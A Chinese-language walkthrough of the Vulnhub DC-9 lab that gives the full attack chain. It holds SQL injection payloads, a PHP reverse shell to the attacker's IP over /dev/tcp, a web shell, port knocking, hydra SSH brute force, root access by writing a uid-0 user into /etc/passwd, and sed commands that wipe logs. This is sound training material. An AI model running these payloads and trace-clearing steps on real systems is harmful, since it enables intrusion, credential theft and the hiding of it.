# 前言

靶机：`DC-8`，IP地址为`192.168.10.11`，后续因为靶机重装，IP地址变为`192.168.10.13`

攻击：`kali`，IP地址为`192.168.10.2`

都采用`VMWare`，网卡为桥接模式

对于文章中涉及到的靶场以及工具，我放置在公众号中，在公众号发送`dc0109`即可获取相关工具

# 主机发现

使用`arp-scan -l`或者`netdiscover -r 192.168.10.1/24`

因为是靶机，所以在同一局域网中，这里使用这两个工具是因为在同一局域网中的扫描速度很快

当然，如果想要模拟真实渗透，可以使用`nmap`等扫描工具

![](D:\stu\vulnhub\DC靶场\pic-9\1.jpg)

# 信息收集 

## 使用nmap扫描端口

扫描目标的全端口，以及服务和操作系统信息

```shell
nmap -sV -O 192.168.10.11 -p-
```

![](D:\stu\vulnhub\DC靶场\pic-9\2.jpg)

## 网站信息探测

访问80端口默认界面，访问页面源代码，包含几个`php`文件路径，但是在这个界面都是可以点击到的

![](D:\stu\vulnhub\DC靶场\pic-9\4.jpg)

使用`gobuster`尝试进行目录爆破，发现爆破的路径，基本上与前面一样

```shell
gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404,403
```

![](D:\stu\vulnhub\DC靶场\pic-9\3.jpg)

在我尝试访问`weclome.php`时，发现提示我以作为`admin`登录，并且下面提示文件不存在，主要就是这时候，点击`logout`退出，是无法退出的

![](D:\stu\vulnhub\DC靶场\pic-9\5.jpg)

发现一个搜索框，是`search.php`，其会把输入的数据，交给`results.php`，有结果，会显示，无结果，也会跳转到`results.php`

# SQL注入

## 测试注入点

尝试数字型测试，发现无任何变化

```shell
1 and 1=1#
1 and 1=1--+
1 and 1=2#
1 and 1-2--+
1 or 1=1#
1 or 1=1--+
```

再次尝试字符型，以`'`进行闭合测试

```shell
1'		无报错，无返回
1' or 1=1--+		无返回
1' or 1=1#			有返回，并且返回的结果是 Display All Records菜单中的内容，这个自己查看一下
```

![](D:\stu\vulnhub\DC靶场\pic-9\6.jpg)

那么可以确定，其应该是搜索这里面的数据，并经过测试，发现其搜索的是上面数据中的`name`

`ok`那么就可以构造语句了，借助上面数据中的一个`name`即可，如，这里借用`tom`

## 手工sql注入

构造语句并测试，发现两个回显不同，说明确实存在

```shell
tom' and 1=1#
tom' and 1=2#
```

再次构造语句进行测试，最终在`7`时无回显，也就是有6个

```shell
tom' order by 6#
```

再次构造`union`测试是否会显示

```shell
tom' union select 1,2,3,4,5,6#
```

![](D:\stu\vulnhub\DC靶场\pic-9\7.jpg)

确定这里有显示就已经`ok`了，还没有对于`union 、 select`等关键字进行过滤操作

直接上

```shell
tom' union select database(),version(),3,user(),5,6#
```

![](D:\stu\vulnhub\DC靶场\pic-9\8.jpg)

构造语句获取表

```shell
tom' union select group_concat(table_name),version(),3,user(),5,6 from information_schema.tables where table_schema=database()#

后面因为原因，再次想要访问，发现原本的语句不能使用，下面是换的语句
tom' union select concat(table_name),null,null,null,null,null from information_schema.tables#
```

![](D:\stu\vulnhub\DC靶场\pic-9\9.jpg)

发现两个表，一个`Users`值得关注

构造语句

```shell
tom' union select concat(column_name),version(),3,user(),5,6 from information_schema.columns where table_name='Users'#

tom' union select concat(column_name),version(),3,user(),5,6 from information_schema.columns where table_name='StaffDetails'#
```

![](D:\stu\vulnhub\DC靶场\pic-9\10.jpg)

直接通过查询获取对应元组的数据

```shell
tom' union select concat(Username,'|',Password),version(),3,user(),5,6 from Users#
```

![](D:\stu\vulnhub\DC靶场\pic-9\11.jpg)

获取到用户名`admin`和密码`856f5de590ef37314e7c3bdf6f8a66dc`

这个像是`md5`加密，访问网站`cmd5.com`，能解出，但是是付费记录

那么换一个网站`somd5.com`，获取密码`transorbital1`

![](D:\stu\vulnhub\DC靶场\pic-9\12.jpg)

在浏览器关闭当前连接的IP，按着`ctrl+shift+delete`，把浏览器最近记录删除，这样再访问`manage`就可以再登录了

## 尝试sql注入反弹shell

这时候输入上面的用户名和密码，即可登录成功，并且，当前登录后的界面只有一个`add recard`是新的，这里就可以与前面的数据进行比对，因为这里应该是写入到数据库中的，因为好多列名都是与前面的一样的

![](D:\stu\vulnhub\DC靶场\pic-9\13.jpg)

尝试直接在这里进行注入下面的语句

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'"); ?>
```

![](D:\stu\vulnhub\DC靶场\pic-9\14.jpg)

那么在前面使用`union`查询的时候，数字`2`和`3`是在一行显示，并且中间有空格的，那么可以根据这个进行拼接反弹`shell`的代码

```shell
firstname:
	<?php 
lastname:
	system($_REQUEST["cmd"]);?>
```

上传成功，但是无法利用

![](D:\stu\vulnhub\DC靶场\pic-9\15.jpg)

可能`general_log`是关闭的，通过前面的注入构造下面的语句进行查看

```
tom' union select variable_name, variable_value,3,4,5,6 FROM information_schema.global_variables WHERE variable_name LIKE '%general%'#
```

![](D:\stu\vulnhub\DC靶场\pic-9\16.jpg)

# 路径遍历漏洞

再次回到这里，还是观察，发现登录后，依然有`File does not exist`，其他界面没有，登录后才有，说明还是调用某个文件，该文件不存在了。

这里我刚开始的时候就测试过，但是没出数据，我还以为是登录问题呢

而事实证明，可能就是，或者说我自己忘记了加入某个东西

在使用`ffuf`和`wfuzz`爆破测试一段时间后，突然就登录不上了，可能是爆破的原因？

> 这里重装靶机，后面IP地址变更为`192.168.10.13`

这里在使用`ffuf`和`wfuzz`，不知道什么原因，即使加上登录条件，也是无法测试出，但是明明就有，换用`burp`，因为本人电脑的原因，这里在物理机上使用`burp`

这里抓取登录后的数据包，然后设置参数进行爆破

![](D:\stu\vulnhub\DC靶场\pic-9\18.jpg)

发现传参为`file`，并且可以看到靶机内的用户很多

![](D:\stu\vulnhub\DC靶场\pic-9\19.jpg)

# 通过路径遍历获取kncok配置文件

但是前面进行端口扫描的时候，`ssh`服务显示是过滤的，说明目标可能对请求进行相关操作，数据库或者其他，

但是在打靶，一般都是所谓的"敲门"，也就是`kncok`，进行`ai`搜索

>`knock`是一个用于端口敲门（Port Knocking）的工具。端口敲门是一种通过按特定顺序连接一系列端口来触发防火墙规则或开启隐藏服务的技术。它允许用户在防火墙后隐藏服务，只有当按照正确的顺序 “敲门”（访问特定端口序列）时，才会允许对目标服务端口的访问。
>
>配置文件通常位于`/etc/knockd.conf`或`/etc/knock.conf`

访问这两个进行测试，最终访问`/etc/knockd.conf`发现信息

![](D:\stu\vulnhub\DC靶场\pic-9\20.jpg)

记住这个序列`7469,8475,9842`，使用`kncok`敲靶机，再次扫描，可以看到已经处于打开状态

```shell
knock 192.168.10.13 7469 8475 9842
```

![](D:\stu\vulnhub\DC靶场\pic-9\21.jpg)

但是到这里没有任何东西了，看了网上的`wp`，啧，少了一个步骤，就是查询数据库，我这里直接使用当前数据库，导致错过大量信息，在`search.php`构造下面语句

```shell
tom' union select concat(schema_name),version(),3,user(),5,6 from information_schema.schemata#
```

![](D:\stu\vulnhub\DC靶场\pic-9\22.jpg)

爆出数据库的表的名称

```shell

tom' union select concat(table_name),version(),3,user(),5,6 from information_schema.tables where table_schema='users'#
```

爆出表中的列名

```shell
tom' union select concat(column_name),version(),3,user(),5,6 from information_schema.columns where table_name='UserDetails'#
```

```shell
tom' union select concat(username,password),version(),3,user(),5,6 from users.UserDetails#
```

![](D:\stu\vulnhub\DC靶场\pic-9\23.jpg)

为了结果更清晰，采用`sqlmap`展示图片，使用`burp`抓取`search.php`请求时的数据包，并把数据包中的内容进行复制

```shell
sqlmap -r search -D users -T UserDetails -C username,password --dump
```

![](D:\stu\vulnhub\DC靶场\pic-9\24.jpg)

可以查看保存后的

![](D:\stu\vulnhub\DC靶场\pic-9\25.jpg)

# ssh爆破

这里可以直接通过`ai`来帮助区分

![](D:\stu\vulnhub\DC靶场\pic-9\26.jpg)

然后保存到两个文件中，使用`hydra`进行爆破

```shell
hydra -L user -P pass 192.168.10.13 ssh
```

等待一会，数据出现，用户名`chandlerb`的密码`UrAG0D!`

用户名`joeyt`的密码`Passw0rd`，用户名`janitor`的密码`Ilovepeepee`

![](D:\stu\vulnhub\DC靶场\pic-9\27.jpg)

测试登录，在登录两个一会后，并没有发现任何东西，包括SUID权限文件，以及`sudo`，系统内核，定时任务，甚至我上传了`pspy64`也没有发现，然后大概知道作者的意思了，文件应该在每个用户的家目录下，所以切换用户，最终在`janitor`发现一个密码本

![](D:\stu\vulnhub\DC靶场\pic-9\28.jpg)

复制内容，然后再使用`hydra`进行爆破

```shell
hydra -L user -P new_pass 192.168.10.13 ssh
```

![](D:\stu\vulnhub\DC靶场\pic-9\29.jpg)

获取新的两组数据，进行登录查看，因为`joeyt`前面登录过，所以没什么东西

# 提权

登录`fredf`后，发现家目录没有东西，然后尝试`sudo`，因为之前使用`find`寻找具有SUID权限的文件，确定有`sudo`的

![](D:\stu\vulnhub\DC靶场\pic-9\30.jpg)

执行文件，提示`test.py`，再搜索，并查看该文件，发现无内容

![](D:\stu\vulnhub\DC靶场\pic-9\31.jpg)

可以看到这个`test.py`是必须要有用户的传参的，并且除了文件名，还需要有两个传参

并且，第二个传参是进行的读文件的操作，第三个传参是进行的写文件的操作，并且是追加的操作

> 就是`test.py a.txt b.txt `读a.txt中的内容追加写入到b.txt文件中

那么直接把`/etc/shadow`文件中的内容，写入到`/tmp/pass`中，然后查看

![](D:\stu\vulnhub\DC靶场\pic-9\32.jpg)

确实发现可以写入，那么把`/etc/passwd`中的`root`信息直接读取，把两个文件中关于`root`的信息都复制到`kali`中的两个文件，使用`unshadow`合并，然后使用`john`进行`hash`破解

但是这个时间是真的长，这里先进行破解，思考其他方式

![](D:\stu\vulnhub\DC靶场\pic-9\33.jpg)

尝试直接获取`root`目录下的`.ssh`目录下的私钥， 但是这里测试，发现说是没有该目录

那么尝试写入`/etc/passwd`

```shell
root:x:0:0:root:/root:/bin/bash
用户名:密码:用户标识号:组标识号:注释性描述:主目录:默认登录Shell

#其中x表示密码存储在/etc/shadow文件中
```

那么这里就不使用x，把密码直接写入在`/etc/passwd`，并仿造`root`的形式，添加一个新用户



```shell
dijia::0:0:dijia:/root:/bin/bash	#尝试构造空密码的具有root权限的用户

gogo:123456:0:0:gogo:/root:/bin/bash	#尝试构造明文密码具有root权限的用户
```

那么尝试进行加密吧，可以使用`openssl`工具进行生成，或者去在线网站进行加密都行

```shell
openssl passwd -6 -salt 123 123456

#这里若是不知道含义，可以具体使用openssl -h 查看帮助，不过最好是在kali中，因为靶机内查看有问题
#openssl passwd是 OpenSSL 工具提供的一个用于生成加密密码（哈希值）的命令
#-6 是指采用sha512算法
#-salt 123 是指使用加盐操作，盐值为123
#123456 为指定加密的密码
#扩展
#-1 是指使用MD5算法
#-5 是指采用SHA-256算法
```

这里可以直接加密自然是可以，不过为了严谨，我这里把之前读取的`/etc/shadow`文件中的密码，进行一个分析，借助网站`www.dcode.fr`，发现解出算法以及盐值

![](D:\stu\vulnhub\DC靶场\pic-9\34.jpg)

![35](D:\stu\vulnhub\DC靶场\pic-9\35.jpg)

那么就按照这个进行加密，然后复制这个加密的结果

```shell
openssl passwd -6 -salt lFbb8QQt2wX7eUeE 123456
```

![](D:\stu\vulnhub\DC靶场\pic-9\36.jpg)

那么现在再次构造，之前是空密码和明文密码，这里采用加密密码，再进行测试

```shell
final1:$6$lFbb8QQt2wX7eUeE$S63c0lmQQPy9FpNzpz5xy688Ur6ZlDQq62BGgeB1tSp5OssLCRc1VhOAIzORv4FplJbZdbR.hohEqY9LCFlmD/:0:0:final1:/root:/bin/bash
```

![](D:\stu\vulnhub\DC靶场\pic-9\37.jpg)

可以看到，成功提权

假设，若是这种方式也不行的话，可能其做了限制，不允许在`/etc/passwd`中添加密码，只能在`/etc/shadow`文件中，那么就需要再次构造了



```shell
#写入到/tmp/final2_user中，然后通过sudo执行test，写入到/etc/passwd中
final2:x:0:0:final2:/root:/bin/bash

#写入到/tmp/final2_pass中，然后通过sudo执行test，写入到/etc/shadow中
final2:$6$lFbb8QQt2wX7eUeE$S63c0lmQQPy9FpNzpz5xy688Ur6ZlDQq62BGgeB1tSp5OssLCRc1VhOAIzORv4FplJbZdbR.hohEqY9LCFlmD/:18259:0:99999:7:::
#这里的加密密码，是上面生成的，就直接使用，知道方法即可
```

![](D:\stu\vulnhub\DC靶场\pic-9\38.jpg)

查看`flag`

![](D:\stu\vulnhub\DC靶场\pic-9\39.jpg)

# 清理痕迹

这里清理痕迹不同于以往，因为存在数据库、ssh爆破、以及敏感文件的修改了

## 删除在数据库添加的数据

首先是在进行`sql`注入时，插入的数据，这里因为靶机重装的原因，导致数据重置，不过方法说一下

首先找到连接数据库的信息

![](D:\stu\vulnhub\DC靶场\pic-9\40.jpg)

然后剩下的就是删除表中的指定内容，这里因为之前确定是在`staff`数据库中，并且在表中`StaffDetails`存储着相关信息，所以重点删除这个表中的指定数据即可

![](D:\stu\vulnhub\DC靶场\pic-9\41.jpg)

## 清理日志

日志文件主要在`/var/log`中，可以使用`sed`删除指定kali的`ip`的行

![](D:\stu\vulnhub\DC靶场\pic-9\42.jpg)

## 清理敏感文件

删除添加在`/etc/passwd`文件中的用户

```shell
sed -i '$d' /etc/passwd
#$表示最后一行，d表示删除
#一般添加的都是在文件的最后，可以自己查看后，根据实际情况去删除
```

删除添加在`/etc/shadow`文件中的密码

```shell
sed -i '$d' /etc/shadow
#与上面一样，一般也是在文件的最后进行添加的
```



# 总结

该靶场考察以下几点

1. 对于`sql`注入，能否找到注入点，然后最好通过手工的方式进行操作，在手工注入获取到结果后，再使用`sqlmap`进行测试，也需要掌握`sqlmap`工具的使用
2. 通过`sql`注入获取到网站的用户名和密码，登录后，继续发现功能点，要懂得去判断。这里就是因为登录后发现显示文件不存在的，推测可能具有文件包含，然后根据这个进行路径遍历测试，发现传参为`file`。还有一点，这里的路径遍历，绝对路径以及远程文件包含都是不行的
3. 对于`ssh`服务扫描发现过滤的情况，考虑防火墙，以及做的安全策略，这里因为是在靶机，所以一般都是使用工具`knock`与防火墙`iptables`搭配，只要符合配置指定的序列，就可以使用`ssh`服务了
4. 对于数据库的信息，最好都看一看，不能只看感觉像是怎么怎么样的。
5. 通过获取的大量用户名和密码，进行`ssh`爆破，获取到可用账号
6. 在`ssh`登录后，寻找各种信息，这里是再次发现一个密码本，然后获取到一个新的用户并且登录
7. 对于可执行文件具有sudo时，要知道怎么调试，这里是执行 后，有用法提示，找到关键文件。然后通过分析关键文件中的代码指令，最终确定可以进行非法读取和写入
8. 对于`/ect/passwd`文件和`/etc/shadow`文件中，存储的形式有什么含义，要清楚的知道













